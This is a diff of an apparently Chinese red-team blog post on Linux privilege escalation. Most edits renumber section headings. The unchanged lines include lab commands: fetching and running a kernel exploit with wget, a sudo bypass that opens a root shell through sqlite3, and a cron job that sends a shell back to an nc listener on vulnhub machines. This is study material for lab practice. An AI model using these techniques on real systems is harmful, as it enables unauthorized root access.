@@ -6,12 +6,12 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="HandheldFriendly" content="True">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
-    <meta name="description" content="Linux 提权杂记0x1 前言  linux提权按类型划分可以归类为以下几种:  内核漏洞利用  root权限运行程序  组件服务  弱&#x2F;重复&#x2F;明文密码  配置错误  suid&#x2F;Guid配置错误  滥用sudo权限  root运行但普通用户可写的脚本  PATH提权  定时任务  nfs   在演示上述漏洞之前我们需要了解linux权限划分和什么是提权?   0x2 什么是提权？  权限提升是利">
+    <meta name="description" content="Linux 提权杂记0x00 前言  linux提权按类型划分可以归类为以下几种:  内核漏洞利用  root权限运行程序  组件服务  弱&#x2F;重复&#x2F;明文密码  配置错误  suid&#x2F;Guid配置错误  滥用sudo权限  root运行但普通用户可写的脚本  PATH提权  定时任务  nfs   在演示上述漏洞之前我们需要了解linux权限划分和什么是提权?   0x01 什么是提权？  权限提升">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Linux 提权杂记">
 <meta property="og:url" content="http://example.com/2022/02/12/Linux-%E6%8F%90%E6%9D%83%E6%9D%82%E8%AE%B0/index.html">
 <meta property="og:site_name" content="ling">
-<meta property="og:description" content="Linux 提权杂记0x1 前言  linux提权按类型划分可以归类为以下几种:  内核漏洞利用  root权限运行程序  组件服务  弱&#x2F;重复&#x2F;明文密码  配置错误  suid&#x2F;Guid配置错误  滥用sudo权限  root运行但普通用户可写的脚本  PATH提权  定时任务  nfs   在演示上述漏洞之前我们需要了解linux权限划分和什么是提权?   0x2 什么是提权？  权限提升是利">
+<meta property="og:description" content="Linux 提权杂记0x00 前言  linux提权按类型划分可以归类为以下几种:  内核漏洞利用  root权限运行程序  组件服务  弱&#x2F;重复&#x2F;明文密码  配置错误  suid&#x2F;Guid配置错误  滥用sudo权限  root运行但普通用户可写的脚本  PATH提权  定时任务  nfs   在演示上述漏洞之前我们需要了解linux权限划分和什么是提权?   0x01 什么是提权？  权限提升">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://s2.loli.net/2022/02/12/VcQtBKpAJG8HOSy.png">
 <meta property="og:image" content="https://s2.loli.net/2022/02/12/TaSJrVxepFtAkh7.png">
@@ -47,7 +47,7 @@
 <meta property="og:image" content="https://s2.loli.net/2022/02/12/PyVbTw8sFjJXiBt.png">
 <meta property="og:image" content="https://s2.loli.net/2022/02/12/NrKS7inZzveCd3q.png">
 <meta property="article:published_time" content="2022-02-11T23:27:05.000Z">
-<meta property="article:modified_time" content="2022-02-11T23:49:12.889Z">
+<meta property="article:modified_time" content="2022-02-12T16:08:57.686Z">
 <meta property="article:author" content="John Doe">
 <meta property="article:tag" content="红队">
 <meta name="twitter:card" content="summary">
@@ -138,7 +138,7 @@
 
     </div>
     <div id="toc">
-      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Linux-%E6%8F%90%E6%9D%83%E6%9D%82%E8%AE%B0"><span class="toc-number">1.</span> <span class="toc-text">Linux 提权杂记</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x1-%E5%89%8D%E8%A8%80"><span class="toc-number">1.1.</span> <span class="toc-text">0x1 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x2-%E4%BB%80%E4%B9%88%E6%98%AF%E6%8F%90%E6%9D%83%EF%BC%9F"><span class="toc-number">1.2.</span> <span class="toc-text">0x2 什么是提权？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x3-Linux%E6%9D%83%E9%99%90%E5%88%92%E5%88%86"><span class="toc-number">1.3.</span> <span class="toc-text">0x3 Linux权限划分</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%9D%83%E9%99%90%E6%8A%BD%E8%B1%A1"><span class="toc-number">1.3.1.</span> <span class="toc-text">1.权限抽象</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-%E5%86%85%E6%A0%B8%E5%88%A9%E7%94%A8"><span class="toc-number">1.4.</span> <span class="toc-text">0x04 内核利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-root%E6%9D%83%E9%99%90%E8%BF%90%E8%A1%8C%E7%A8%8B%E5%BA%8F"><span class="toc-number">1.5.</span> <span class="toc-text">0x05 root权限运行程序</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-%E7%BB%84%E4%BB%B6%E6%9C%8D%E5%8A%A1"><span class="toc-number">1.6.</span> <span class="toc-text">0x06 组件服务</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x7-%E5%BC%B1-%E9%87%8D%E5%A4%8D-%E6%98%8E%E6%96%87%E5%AF%86%E7%A0%81"><span class="toc-number">1.7.</span> <span class="toc-text">0x7 弱&#x2F;重复&#x2F;明文密码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x8-%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF"><span class="toc-number">1.8.</span> <span class="toc-text">0x8 配置错误</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x9-%E6%BB%A5%E7%94%A8sudo%E6%9D%83%E9%99%90"><span class="toc-number">1.9.</span> <span class="toc-text">0x9 滥用sudo权限</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x10-suid-sgid-%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6"><span class="toc-number">1.10.</span> <span class="toc-text">0x10 suid&#x2F;sgid 可执行文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x11-root%E8%BF%90%E8%A1%8C%E4%BD%86%E6%99%AE%E9%80%9A%E7%94%A8%E6%88%B7%E5%8F%AF%E5%86%99%E7%9A%84%E8%84%9A%E6%9C%AC"><span class="toc-number">1.11.</span> <span class="toc-text">0x11 root运行但普通用户可写的脚本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x12-PATH%E6%8F%90%E6%9D%83"><span class="toc-number">1.12.</span> <span class="toc-text">0x12 PATH提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x13-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1"><span class="toc-number">1.13.</span> <span class="toc-text">0x13 定时任务</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x14-nfs"><span class="toc-number">1.14.</span> <span class="toc-text">0x14 nfs</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x15-%E5%B7%A5%E5%85%B7"><span class="toc-number">1.15.</span> <span class="toc-text">0x15 工具</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-LinPEAS"><span class="toc-number">1.15.1.</span> <span class="toc-text">1.LinPEAS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-LinEnum"><span class="toc-number">1.15.2.</span> <span class="toc-text">2.LinEnum</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-linux-exploit-suggester"><span class="toc-number">1.15.3.</span> <span class="toc-text">3.linux-exploit-suggester</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%93%E8%A8%80"><span class="toc-number">1.16.</span> <span class="toc-text">结言</span></a></li></ol></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Linux-%E6%8F%90%E6%9D%83%E6%9D%82%E8%AE%B0"><span class="toc-number">1.</span> <span class="toc-text">Linux 提权杂记</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-%E5%89%8D%E8%A8%80"><span class="toc-number">1.1.</span> <span class="toc-text">0x00 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E4%BB%80%E4%B9%88%E6%98%AF%E6%8F%90%E6%9D%83%EF%BC%9F"><span class="toc-number">1.2.</span> <span class="toc-text">0x01 什么是提权？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-Linux%E6%9D%83%E9%99%90%E5%88%92%E5%88%86"><span class="toc-number">1.3.</span> <span class="toc-text">0x02 Linux权限划分</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%9D%83%E9%99%90%E6%8A%BD%E8%B1%A1"><span class="toc-number">1.3.1.</span> <span class="toc-text">1.权限抽象</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-%E5%86%85%E6%A0%B8%E5%88%A9%E7%94%A8"><span class="toc-number">1.4.</span> <span class="toc-text">0x03 内核利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-root%E6%9D%83%E9%99%90%E8%BF%90%E8%A1%8C%E7%A8%8B%E5%BA%8F"><span class="toc-number">1.5.</span> <span class="toc-text">0x04 root权限运行程序</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-%E7%BB%84%E4%BB%B6%E6%9C%8D%E5%8A%A1"><span class="toc-number">1.6.</span> <span class="toc-text">0x05 组件服务</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-%E5%BC%B1-%E9%87%8D%E5%A4%8D-%E6%98%8E%E6%96%87%E5%AF%86%E7%A0%81"><span class="toc-number">1.7.</span> <span class="toc-text">0x06 弱&#x2F;重复&#x2F;明文密码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x07-%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF"><span class="toc-number">1.8.</span> <span class="toc-text">0x07 配置错误</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x08-%E6%BB%A5%E7%94%A8sudo%E6%9D%83%E9%99%90"><span class="toc-number">1.9.</span> <span class="toc-text">0x08 滥用sudo权限</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x09-suid-sgid-%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6"><span class="toc-number">1.10.</span> <span class="toc-text">0x09 suid&#x2F;sgid 可执行文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x0A-root%E8%BF%90%E8%A1%8C%E4%BD%86%E6%99%AE%E9%80%9A%E7%94%A8%E6%88%B7%E5%8F%AF%E5%86%99%E7%9A%84%E8%84%9A%E6%9C%AC"><span class="toc-number">1.11.</span> <span class="toc-text">0x0A root运行但普通用户可写的脚本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x0B-PATH%E6%8F%90%E6%9D%83"><span class="toc-number">1.12.</span> <span class="toc-text">0x0B PATH提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x0C-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1"><span class="toc-number">1.13.</span> <span class="toc-text">0x0C 定时任务</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x0D-nfs"><span class="toc-number">1.14.</span> <span class="toc-text">0x0D nfs</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0xE-%E5%B7%A5%E5%85%B7"><span class="toc-number">1.15.</span> <span class="toc-text">0xE 工具</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-LinPEAS"><span class="toc-number">1.15.1.</span> <span class="toc-text">1.LinPEAS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-LinEnum"><span class="toc-number">1.15.2.</span> <span class="toc-text">2.LinEnum</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-linux-exploit-suggester"><span class="toc-number">1.15.3.</span> <span class="toc-text">3.linux-exploit-suggester</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x0F-%E7%BB%93%E8%A8%80"><span class="toc-number">1.16.</span> <span class="toc-text">0x0F 结言</span></a></li></ol></li></ol>
     </div>
   </span>
 </div>
@@ -182,7 +182,7 @@
   
 
   <div class="content" itemprop="articleBody">
-    <h1 id="Linux-提权杂记"><a href="#Linux-提权杂记" class="headerlink" title="Linux 提权杂记"></a>Linux 提权杂记</h1><h2 id="0x1-前言"><a href="#0x1-前言" class="headerlink" title="0x1 前言"></a>0x1 前言</h2><p>  linux提权按类型划分可以归类为以下几种:</p>
+    <h1 id="Linux-提权杂记"><a href="#Linux-提权杂记" class="headerlink" title="Linux 提权杂记"></a>Linux 提权杂记</h1><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>  linux提权按类型划分可以归类为以下几种:</p>
 <ul>
 <li><p>内核漏洞利用</p>
 </li>
@@ -208,9 +208,9 @@
 <p>  在演示上述漏洞之前我们需要了解<code>linux</code>权限划分和什么是提权?</p>
 </li>
 </ul>
-<h2 id="0x2-什么是提权？"><a href="#0x2-什么是提权？" class="headerlink" title="0x2 什么是提权？"></a>0x2 什么是提权？</h2><p>  权限提升是利用操作系统或软件应用程序中的错误、设计缺陷或配置疏忽来获得对通常不受应用程序或用户保护的资源的提升访问权限的行为。结果是，具有比应用程序开发人员或系统管理员预期更多权限的应用程序可以执行未经授权的操作。</p>
+<h2 id="0x01-什么是提权？"><a href="#0x01-什么是提权？" class="headerlink" title="0x01 什么是提权？"></a>0x01 什么是提权？</h2><p>  权限提升是利用操作系统或软件应用程序中的错误、设计缺陷或配置疏忽来获得对通常不受应用程序或用户保护的资源的提升访问权限的行为。结果是，具有比应用程序开发人员或系统管理员预期更多权限的应用程序可以执行未经授权的操作。</p>
 <p>  系统上的<code>root</code>账号拥有对操作系统的完全管理级别访问权限，我们有时候渗透过程获取的<code>linux</code>账号可能是普通用户权限对操作系统的操作有限。因此我们需要想法设法把自身权限提高来进行其他操作。</p>
-<h2 id="0x3-Linux权限划分"><a href="#0x3-Linux权限划分" class="headerlink" title="0x3 Linux权限划分"></a>0x3 Linux权限划分</h2><h3 id="1-权限抽象"><a href="#1-权限抽象" class="headerlink" title="1.权限抽象"></a>1.权限抽象</h3><p>  一个完整的权限管理体系，要有合理的抽象。这里就包括对用户、进程、文件、内存、系统调用等抽象。</p>
+<h2 id="0x02-Linux权限划分"><a href="#0x02-Linux权限划分" class="headerlink" title="0x02 Linux权限划分"></a>0x02 Linux权限划分</h2><h3 id="1-权限抽象"><a href="#1-权限抽象" class="headerlink" title="1.权限抽象"></a>1.权限抽象</h3><p>  一个完整的权限管理体系，要有合理的抽象。这里就包括对用户、进程、文件、内存、系统调用等抽象。</p>
 <p>  至于什么是抽象？我是这么理解，可以把抽象想象成一个根据类别分化的领域。</p>
 <p>  比如用户的抽象可以想象成用户的领域，这个领域里用户会根据类别或其他特征进行分化。同时用户的领域是可以在系统的领域里面。领域不只是单独存在还可以像套娃一样的存在。</p>
 <p>  <strong>现在，我们来说一下用户和组</strong>。<code>Linux</code>是一个<code>多用户平台</code>,允许多个用户同时登录系统工作。<code>Linux</code>将用户抽象成了账号，账号可以登录系统，比如通过<code>登录名+密码</code>的方式登录，或者通过<code>证书</code>的方式登录。</p>
@@ -334,7 +334,7 @@
 <p><strong>参考链接</strong></p>
 <p>  <a target="_blank" rel="noopener" href="https://learn.lianglianglee.com/%E4%B8%93%E6%A0%8F/%E9%87%8D%E5%AD%A6%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-%E5%AE%8C/08%20%20%E7%94%A8%E6%88%B7%E5%92%8C%E6%9D%83%E9%99%90%E7%AE%A1%E7%90%86%E6%8C%87%E4%BB%A4%EF%BC%9A%20%E8%AF%B7%E7%AE%80%E8%BF%B0%20Linux%20%E6%9D%83%E9%99%90%E5%88%92%E5%88%86%E7%9A%84%E5%8E%9F%E5%88%99%EF%BC%9F.md">https://learn.lianglianglee.com/%E4%B8%93%E6%A0%8F/%E9%87%8D%E5%AD%A6%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-%E5%AE%8C/08%20%20%E7%94%A8%E6%88%B7%E5%92%8C%E6%9D%83%E9%99%90%E7%AE%A1%E7%90%86%E6%8C%87%E4%BB%A4%EF%BC%9A%20%E8%AF%B7%E7%AE%80%E8%BF%B0%20Linux%20%E6%9D%83%E9%99%90%E5%88%92%E5%88%86%E7%9A%84%E5%8E%9F%E5%88%99%EF%BC%9F.md</a></p>
 <p>  <a target="_blank" rel="noopener" href="https://www.maketecheasier.com/file-permissions-what-does-chmod-777-means/">https://www.maketecheasier.com/file-permissions-what-does-chmod-777-means/</a></p>
-<h2 id="0x04-内核利用"><a href="#0x04-内核利用" class="headerlink" title="0x04 内核利用"></a>0x04 内核利用</h2><p>  各种<code>Linux</code>内核版本都存在内核级漏洞利用。一个非常著名的例子就是<a target="_blank" rel="noopener" href="https://github.com/dirtycow/dirtycow.github.io">Dirty COW</a> (CVE-2016-5195)，俗称<code>脏牛漏洞</code>。该漏洞利用内核中的漏洞以<code>root</code>权限执行代码。</p>
+<h2 id="0x03-内核利用"><a href="#0x03-内核利用" class="headerlink" title="0x03 内核利用"></a>0x03 内核利用</h2><p>  各种<code>Linux</code>内核版本都存在内核级漏洞利用。一个非常著名的例子就是<a target="_blank" rel="noopener" href="https://github.com/dirtycow/dirtycow.github.io">Dirty COW</a> (CVE-2016-5195)，俗称<code>脏牛漏洞</code>。该漏洞利用内核中的漏洞以<code>root</code>权限执行代码。</p>
 <p>  有些内核漏洞只需要<code>下载</code>、<code>编译</code>、<code>运行</code>就可以完成一次攻击，甚是简单。但是有一些内核漏洞需要修改<code>payload</code>没那么简单，需要微调。但是总体来说<code>内核漏洞提权</code>是一个普遍存在的方式。</p>
 <p>  <strong>注意:利用内核漏洞有可能导致系统不稳定，因此在针对生产系统运行内核漏洞需要注意</strong></p>
 <p><strong>演示</strong></p>
@@ -354,7 +354,7 @@
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget http://10.10.10.10/37292</span><br><span class="line">chmod 777 ./37292</span><br><span class="line">./37292</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://s2.loli.net/2022/02/12/tyoWK8wEigeRDdm.png" alt="image-20220211003737388"></p>
-<h2 id="0x05-root权限运行程序"><a href="#0x05-root权限运行程序" class="headerlink" title="0x05 root权限运行程序"></a>0x05 root权限运行程序</h2><p>  <code>root</code>权限运行程序这个故名思意就是以<code>root</code>权限运行程序，比如<code>mysql</code>、<code>Redis</code>等。我这里使用<code>mysql</code>作为演示，因为这个很经典。</p>
+<h2 id="0x04-root权限运行程序"><a href="#0x04-root权限运行程序" class="headerlink" title="0x04 root权限运行程序"></a>0x04 root权限运行程序</h2><p>  <code>root</code>权限运行程序这个故名思意就是以<code>root</code>权限运行程序，比如<code>mysql</code>、<code>Redis</code>等。我这里使用<code>mysql</code>作为演示，因为这个很经典。</p>
 <p><strong>演示</strong></p>
 <p>  <strong>环境: <code>vulnhub-Raven</code></strong></p>
 <p>  使用<code>ps -aux | grep mysql</code>搜索<code>mysql</code>服务</p>
@@ -389,7 +389,7 @@
 <p><strong>参考链接</strong></p>
 <p>  <a target="_blank" rel="noopener" href="https://www.hackingarticles.in/hack-the-raven-walkthrough-ctf-challenge/">https://www.hackingarticles.in/hack-the-raven-walkthrough-ctf-challenge/</a></p>
 <p>  <a target="_blank" rel="noopener" href="https://steflan-security.com/linux-privilege-escalation-exploiting-user-defined-functions/">https://steflan-security.com/linux-privilege-escalation-exploiting-user-defined-functions/</a></p>
-<h2 id="0x06-组件服务"><a href="#0x06-组件服务" class="headerlink" title="0x06 组件服务"></a>0x06 组件服务</h2><p>  组件服务提权包含一些系统自带的软件和用户自行安装的软件都在其中。</p>
+<h2 id="0x05-组件服务"><a href="#0x05-组件服务" class="headerlink" title="0x05 组件服务"></a>0x05 组件服务</h2><p>  组件服务提权包含一些系统自带的软件和用户自行安装的软件都在其中。</p>
 <p>  我采用<code>sudo(CVE-2021-3156)</code>漏洞进行演示</p>
 <p><strong>演示</strong></p>
 <p>  <strong>环境:<code>vulnhub-devguru</code></strong></p>
@@ -403,7 +403,7 @@
 
 <p><img src="https://s2.loli.net/2022/02/12/ynYRoMCi2gH83E9.png" alt="image-20220211181814247"></p>
 <p>  当然不是所有组件漏洞都可以如此完美运行，提权的过程就如同人生充满了意外。</p>
-<h2 id="0x7-弱-重复-明文密码"><a href="#0x7-弱-重复-明文密码" class="headerlink" title="0x7 弱/重复/明文密码"></a>0x7 弱/重复/明文密码</h2><p>  如果进入服务时，我们拥有一个或多个密码，可以先尝试这些密码能否帮助我们获取更高权限。</p>
+<h2 id="0x06-弱-重复-明文密码"><a href="#0x06-弱-重复-明文密码" class="headerlink" title="0x06 弱/重复/明文密码"></a>0x06 弱/重复/明文密码</h2><p>  如果进入服务时，我们拥有一个或多个密码，可以先尝试这些密码能否帮助我们获取更高权限。</p>
 <p>  如果不能，那我们可以检测连接数据库的文件(<code>config.php</code>或类似文件)。或者检查<code>dockerfile</code>等文件脚本。</p>
 <p><strong>演示</strong></p>
 <p>  <strong>环境:<code>hackthebox-Unbalanced</code></strong></p>
@@ -416,7 +416,7 @@
 <p><img src="https://s2.loli.net/2022/02/12/qfbatBdRrD29Ihm.png" alt="image-20220211191832280"></p>
 <p><strong>参考链接</strong></p>
 <p>  <a target="_blank" rel="noopener" href="https://y4th0ts.medium.com/unbalanced-hackthebox-c8d086b6f524">https://y4th0ts.medium.com/unbalanced-hackthebox-c8d086b6f524</a></p>
-<h2 id="0x8-配置错误"><a href="#0x8-配置错误" class="headerlink" title="0x8 配置错误"></a>0x8 配置错误</h2><p>  <code>Linux</code>中提权所利用的配置错误，很多时候都是利用权限配置错误。比如<code>/etc/passwd</code>文件权限配置错误，给普通用户拥有对其文件写入的权限。或者普通用户拥有对<code>/etc/shadow</code>文件读取权限等。</p>
+<h2 id="0x07-配置错误"><a href="#0x07-配置错误" class="headerlink" title="0x07 配置错误"></a>0x07 配置错误</h2><p>  <code>Linux</code>中提权所利用的配置错误，很多时候都是利用权限配置错误。比如<code>/etc/passwd</code>文件权限配置错误，给普通用户拥有对其文件写入的权限。或者普通用户拥有对<code>/etc/shadow</code>文件读取权限等。</p>
 <p><strong>演示</strong></p>
 <p>  <strong>环境:<code>ubuntu 16</code></strong></p>
 <p>  查看<code>/etc/passwd</code>权限配置</p>
@@ -434,7 +434,7 @@
 
 <p>  我们登录<code>user</code>用户就会切换到<code>root</code>权限</p>
 <p><img src="https://s2.loli.net/2022/02/12/gIToamWPD1O2tzk.png" alt="image-20220212005433098"></p>
-<h2 id="0x9-滥用sudo权限"><a href="#0x9-滥用sudo权限" class="headerlink" title="0x9 滥用sudo权限"></a>0x9 滥用sudo权限</h2><p>  <code>sudo</code>是一个类<code>unix</code>系统软件，它使用户能够以其他用户的安全权限运行程序，默认情况下是<code>root</code>权限。<code>sudo</code>提权在<code>ctf</code>环境中也是经常出现，不过现实实际情况比较小。</p>
+<h2 id="0x08-滥用sudo权限"><a href="#0x08-滥用sudo权限" class="headerlink" title="0x08 滥用sudo权限"></a>0x08 滥用sudo权限</h2><p>  <code>sudo</code>是一个类<code>unix</code>系统软件，它使用户能够以其他用户的安全权限运行程序，默认情况下是<code>root</code>权限。<code>sudo</code>提权在<code>ctf</code>环境中也是经常出现，不过现实实际情况比较小。</p>
 <p><strong>演示</strong></p>
 <p>  <strong>环境:<code>vulnhub-devguru</code></strong></p>
 <p>  <code>sudo -l</code>查看<code>sudo</code>是否存在滥用行为</p>
@@ -443,7 +443,7 @@
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -u<span class="comment">#-1 sqlite3 /dev/null &#x27;.shell /bin/bash&#x27;</span></span><br></pre></td></tr></table></figure>
 
 <p><img src="https://s2.loli.net/2022/02/12/K6Jk8oucISbyxUZ.png" alt="image-20220212011006346"></p>
-<h2 id="0x10-suid-sgid-可执行文件"><a href="#0x10-suid-sgid-可执行文件" class="headerlink" title="0x10 suid/sgid 可执行文件"></a>0x10 suid/sgid 可执行文件</h2><p>  <code>SUID(set user ID)</code>和<code>SGID(set group ID)</code>是可以对可执行文件设置的两个特殊权限，这些权限允许正在执行的文件以所有者或组的权限执行。<code>suid</code>和<code>sgid</code>标志只对可执行二进制文件有影响，对脚本(如：<code>bash</code>、<code>python</code>、<code>perl</code>)是没有影响。</p>
+<h2 id="0x09-suid-sgid-可执行文件"><a href="#0x09-suid-sgid-可执行文件" class="headerlink" title="0x09 suid/sgid 可执行文件"></a>0x09 suid/sgid 可执行文件</h2><p>  <code>SUID(set user ID)</code>和<code>SGID(set group ID)</code>是可以对可执行文件设置的两个特殊权限，这些权限允许正在执行的文件以所有者或组的权限执行。<code>suid</code>和<code>sgid</code>标志只对可执行二进制文件有影响，对脚本(如：<code>bash</code>、<code>python</code>、<code>perl</code>)是没有影响。</p>
 <ul>
 <li><code>suid</code>: 可执行文件的特殊文件权限。这使其用户都能够执行该文件。包括非文件所有者(组)以外的人。是<code>s</code></li>
 <li><code>sgid</code>: 这也是可执行文件的特殊权限，不同的是其他用户可以继承组所有者的有效<code>gid</code>。</li>
@@ -466,7 +466,7 @@
 
 <p>  使用<code>user</code>就可以变成<code>root</code>权限</p>
 <p><img src="https://s2.loli.net/2022/02/12/5eyX76wYNxIfcs9.png" alt="image-20220212031759748"></p>
-<h2 id="0x11-root运行但普通用户可写的脚本"><a href="#0x11-root运行但普通用户可写的脚本" class="headerlink" title="0x11 root运行但普通用户可写的脚本"></a>0x11 root运行但普通用户可写的脚本</h2><p>  标题写的很明白，好像没什么可说的…</p>
+<h2 id="0x0A-root运行但普通用户可写的脚本"><a href="#0x0A-root运行但普通用户可写的脚本" class="headerlink" title="0x0A root运行但普通用户可写的脚本"></a>0x0A root运行但普通用户可写的脚本</h2><p>  标题写的很明白，好像没什么可说的…</p>
 <p><strong>演示</strong></p>
 <p>  <strong>环境:<code>vulnhub-SkyDogCTF</code></strong></p>
 <p>  使用命令快速搜索可写的文件</p>
@@ -481,7 +481,7 @@
 
 <p>  运行脚本</p>
 <p><img src="https://s2.loli.net/2022/02/12/wkQfjaJKBhOC2u4.png" alt="image-20220212035809340"></p>
-<h2 id="0x12-PATH提权"><a href="#0x12-PATH提权" class="headerlink" title="0x12 PATH提权"></a>0x12 PATH提权</h2><p>  <code>路径提权</code>是一个经典的提权方式，在各种<code>ctf</code>环境你会经常遇到这种类型的提权。</p>
+<h2 id="0x0B-PATH提权"><a href="#0x0B-PATH提权" class="headerlink" title="0x0B PATH提权"></a>0x0B PATH提权</h2><p>  <code>路径提权</code>是一个经典的提权方式，在各种<code>ctf</code>环境你会经常遇到这种类型的提权。</p>
 <p><strong>演示</strong></p>
 <p>  <strong>环境:<code>vulnhub-nullbyte</code></strong></p>
 <p>  寻找可利用的二进制文件</p>
@@ -496,7 +496,7 @@
 
 <p>  重新执行<code>/var/www/backup/procwatch</code></p>
 <p><img src="https://s2.loli.net/2022/02/12/HIo4kWSVXCOhLGa.png" alt="image-20220212045729957"></p>
-<h2 id="0x13-定时任务"><a href="#0x13-定时任务" class="headerlink" title="0x13 定时任务"></a>0x13 定时任务</h2><p>  <code>Linux</code>定时任务称为<code>crontab</code>，用来以固定时间、日期或间隔定时运行任务。</p>
+<h2 id="0x0C-定时任务"><a href="#0x0C-定时任务" class="headerlink" title="0x0C 定时任务"></a>0x0C 定时任务</h2><p>  <code>Linux</code>定时任务称为<code>crontab</code>，用来以固定时间、日期或间隔定时运行任务。</p>
 <p><strong>演示</strong></p>
 <p>  <strong>环境:<code>vulnhub-sar</code></strong></p>
 <p>  查看定时任务</p>
@@ -519,7 +519,7 @@
 
 <p>  这时候<code>kali</code>开启<code>nc</code>等待<code>5分钟</code>就可以获取<code>shell</code></p>
 <p><img src="https://s2.loli.net/2022/02/12/TajsMNAb7zd8Cl3.png" alt="image-20220212054632467"></p>
-<h2 id="0x14-nfs"><a href="#0x14-nfs" class="headerlink" title="0x14 nfs"></a>0x14 nfs</h2><p>  <code>网络文件共享(NFS)</code>是一种协议，允许他人通过网络与其他<code>linux</code>客户端共享文件，同时还需要其他人对文件进行权限修改。</p>
+<h2 id="0x0D-nfs"><a href="#0x0D-nfs" class="headerlink" title="0x0D nfs"></a>0x0D nfs</h2><p>  <code>网络文件共享(NFS)</code>是一种协议，允许他人通过网络与其他<code>linux</code>客户端共享文件，同时还需要其他人对文件进行权限修改。</p>
 <p><strong>演示</strong></p>
 <p>  <strong>环境:<code>vulnhub-0rcus</code></strong></p>
 <p>  查看端口开放</p>
@@ -539,13 +539,13 @@
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line">./t</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://s2.loli.net/2022/02/12/NrKS7inZzveCd3q.png" alt="image-20220212071307197"></p>
-<h2 id="0x15-工具"><a href="#0x15-工具" class="headerlink" title="0x15 工具"></a>0x15 工具</h2><p>  利用工具进行辅助提权，会让我们干活事半功倍。但是如果仔细介绍工具感觉又可以水一篇文章，所以我会简单的一句话概况。</p>
+<h2 id="0xE-工具"><a href="#0xE-工具" class="headerlink" title="0xE 工具"></a>0xE 工具</h2><p>  利用工具进行辅助提权，会让我们干活事半功倍。但是如果仔细介绍工具感觉又可以水一篇文章，所以我会简单的一句话概况。</p>
 <h3 id="1-LinPEAS"><a href="#1-LinPEAS" class="headerlink" title="1.LinPEAS"></a>1.LinPEAS</h3><p>  <code>linpeas</code>是一个不错寻找敏感(<code>password</code>)信息的提权脚本</p>
 <p>  <a target="_blank" rel="noopener" href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS">https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS</a></p>
